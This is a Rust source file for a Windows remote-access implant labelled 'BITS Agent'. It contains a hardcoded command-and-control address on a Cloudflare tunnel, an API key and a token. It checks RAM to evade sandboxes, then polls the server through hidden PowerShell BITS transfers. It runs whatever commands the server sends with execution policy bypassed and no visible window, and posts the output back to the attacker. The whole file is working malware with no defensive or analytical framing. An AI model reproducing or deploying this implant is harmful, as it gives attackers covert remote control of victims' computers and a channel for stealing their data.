// BITS Agent - Uses Windows Background Intelligent Transfer Service
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::os::windows::process::CommandExt;
use std::thread;
use std::time::Duration;
use std::fs;
use std::env;
use std::path::PathBuf;
use rand::Rng;
use serde::{Deserialize, Serialize};

#[link(name = "ole32")]
extern "system" {
    fn CoInitializeEx(pvReserved: *mut std::ffi::c_void, dwCoInit: u32) -> i32;
    fn CoUninitialize();
    fn CoCreateInstance(
        rclsid: *const GUID,
        pUnkOuter: *mut std::ffi::c_void,
        dwClsContext: u32,
        riid: *const GUID,
        ppv: *mut *mut std::ffi::c_void,
    ) -> i32;
}

#[repr(C)]
struct GUID {
    Data1: u32,
    Data2: u16,
    Data3: u16,
    Data4: [u8; 8],
}

// BITS GUIDs
const CLSID_BITS: GUID = GUID {
    Data1: 0x4991d34b,
    Data2: 0x80a1,
    Data3: 0x4291,
    Data4: [0x83, 0xb6, 0x33, 0x28, 0x36, 0x6b, 0x90, 0x97],
};

const IID_BITS_MANAGER: GUID = GUID {
    Data1: 0x5ce34c0d,
    Data2: 0x0dc9,
    Data3: 0x4c1f,
    Data4: [0x89, 0x7c, 0xda, 0xa1, 0xb7, 0x8c, 0xee, 0x7c],
};

const COINIT_MULTITHREADED: u32 = 0;
const CLSCTX_LOCAL_SERVER: u32 = 4;

// C2 config
fn get_c2() -> String { "https://geometry-offered-guns-replies.trycloudflare.com".to_string() }
fn get_api() -> String { "051dfe1cf5e570846315512a11396f7d".to_string() }
fn get_tok() -> String { "8ca60eebbe9a141869305ed9ab1a0050".to_string() }

#[derive(Deserialize)]
struct CmdResponse { command: Option<String> }

#[derive(Serialize)]
struct ResultPayload { result: String }

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn get_temp_path() -> PathBuf {
    env::temp_dir()
}

// Use PowerShell Start-BitsTransfer for downloads
fn bits_download(url: &str) -> Option<String> {
    let temp_file = get_temp_path().join(format!("wub{}.tmp", rand::thread_rng().gen_range(1000..9999)));
    let temp_path = temp_file.to_string_lossy().to_string();
    
    let ps_cmd = format!(
        "Start-BitsTransfer -Source '{}' -Destination '{}' -ErrorAction SilentlyContinue",
        url, temp_path
    );
    
    let output = std::process::Command::new("powershell.exe")
        .args(&["-NoP", "-NonI", "-W", "Hidden", "-C", &ps_cmd])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output();
    
    if output.is_ok() {
        thread::sleep(Duration::from_millis(500));
        if let Ok(content) = fs::read_to_string(&temp_path) {
            let _ = fs::remove_file(&temp_path);
            return Some(content);
        }
    }
    None
}

// Use PowerShell Invoke-WebRequest for POST (BITS doesn't do POST well)
fn http_post(url: &str, api_key: &str, body: &str) -> bool {
    let ps_cmd = format!(
        "$h = @{{'X-API-Key'='{}'; 'Content-Type'='application/json'}}; Invoke-RestMethod -Uri '{}' -Method POST -Headers $h -Body '{}' -ErrorAction SilentlyContinue",
        api_key, url, body.replace("'", "''")
    );
    
    let output = std::process::Command::new("powershell.exe")
        .args(&["-NoP", "-NonI", "-W", "Hidden", "-C", &ps_cmd])
        .creation_flags(0x08000000)
        .output();
    
    output.is_ok()
}

fn run_command(cmd: &str) -> String {
    let temp_file = get_temp_path().join(format!("wuc{}.tmp", rand::thread_rng().gen_range(1000..9999)));
    let temp_path = temp_file.to_string_lossy().to_string();
    
    let ps_cmd = format!(
        "{} | Out-File -Encoding ascii -FilePath '{}'",
        cmd, temp_path
    );
    
    let _ = std::process::Command::new("powershell.exe")
        .args(&["-NoP", "-NonI", "-W", "Hidden", "-Ep", "Bypass", "-C", &ps_cmd])
        .creation_flags(0x08000000)
        .output();
    
    thread::sleep(Duration::from_millis(1000));
    
    if let Ok(content) = fs::read_to_string(&temp_path) {
        let _ = fs::remove_file(&temp_path);
        return content;
    }
    "OK".to_string()
}

fn check_sandbox() -> bool {
    // Delay
    thread::sleep(Duration::from_secs(3));
    
    // Check RAM
    let output = std::process::Command::new("wmic")
        .args(&["computersystem", "get", "totalphysicalmemory"])
        .creation_flags(0x08000000)
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        if let Some(line) = text.lines().nth(1) {
            if let Ok(mem) = line.trim().parse::<u64>() {
                if mem < 2_000_000_000 { return false; }
            }
        }
    }
    true
}

fn main() {
    if !check_sandbox() { return; }
    
    let c2_url = get_c2();
    let token = get_tok();
    let api_key = get_api();
    
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "PC".to_string());
    let agent_id = format!("{}-{:04x}", hostname, rand::thread_rng().gen_range(1..=0xFFFF));
    
    let cmd_url = format!("{}/bits/cmd/{}?key={}", c2_url, agent_id, token);
    let result_url = format!("{}/bits/result/{}?key={}", c2_url, agent_id, token);
    
    loop {
        // Poll for command using BITS
        if let Some(resp) = bits_download(&cmd_url) {
            let cmd = serde_json::from_str::<CmdResponse>(&resp)
                .ok()
                .and_then(|r| r.command)
                .unwrap_or_else(|| resp.trim().to_string());
            
            if !cmd.is_empty() {
                let result = run_command(&cmd);
                let payload = serde_json::to_string(&ResultPayload { result })
                    .unwrap_or_else(|_| r#"{"result":"OK"}"#.to_string());
                
                http_post(&result_url, &api_key, &payload);
            }
        }
        
        // Random jitter 5-8s
        let delay = rand::thread_rng().gen_range(5000..8000);
        thread::sleep(Duration::from_millis(delay));
    }
}
